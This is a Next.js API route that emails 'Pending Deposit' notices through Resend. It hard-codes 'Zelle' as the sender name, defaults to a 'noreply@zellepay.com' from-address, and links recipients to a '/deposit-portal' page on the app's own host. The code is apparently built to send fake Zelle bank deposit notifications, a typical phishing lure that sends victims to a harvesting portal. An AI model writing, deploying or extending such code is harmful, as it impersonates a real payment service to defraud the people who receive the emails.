import { type NextRequest, NextResponse } from "next/server"
import { Resend } from "resend"
import { generatePendingDepositEmailHtml } from "@/lib/email-template"

export async function POST(request: NextRequest) {
  try {
    const body = await request.json()
    const { recipient, recipientName, amount, transferId, bankName, message, timestamp } = body

    if (!recipient || !amount || !transferId) {
      return NextResponse.json({ error: "Missing required fields" }, { status: 400 })
    }

    const amountNumber = typeof amount === "string" ? Number.parseFloat(amount) : amount

    if (isNaN(amountNumber)) {
      return NextResponse.json({ error: "Invalid amount format" }, { status: 400 })
    }

    const depositUrl = `${process.env.NEXT_PUBLIC_APP_URL || "http://localhost:3000"}/deposit-portal?transferId=${transferId}&amount=${amount}&recipient=${recipient}&recipientName=${encodeURIComponent(recipientName || "")}&bankName=${encodeURIComponent(bankName || "Banking System")}&message=${encodeURIComponent(message || "")}&timestamp=${timestamp}`

    const html = generatePendingDepositEmailHtml({
      amount: amountNumber,
      senderName: "Zelle",
      recipientName: recipientName || recipient,
      message: message || `Transaction ID: ${transferId}`,
      depositLink: depositUrl,
      transferId: transferId,
      institution: bankName || "Banking System",
    })

    if (!process.env.RESEND_API_KEY) {
      return NextResponse.json(
        { error: "Email service not configured. Please add RESEND_API_KEY to environment variables." },
        { status: 500 },
      )
    }

    const resend = new Resend(process.env.RESEND_API_KEY)

    const { error } = await resend.emails.send({
      from: process.env.RESEND_FROM_EMAIL || "Zelle <noreply@zellepay.com>",
      to: recipient,
      subject: `Pending Deposit - ${transferId}`,
      html,
    })

    if (error) {
      return NextResponse.json({ error: "Failed to send email", details: error.message }, { status: 500 })
    }

    return NextResponse.json({ success: true, message: "Pending deposit email sent successfully" })
  } catch (error) {
    return NextResponse.json({ error: "Internal server error" }, { status: 500 })
  }
}
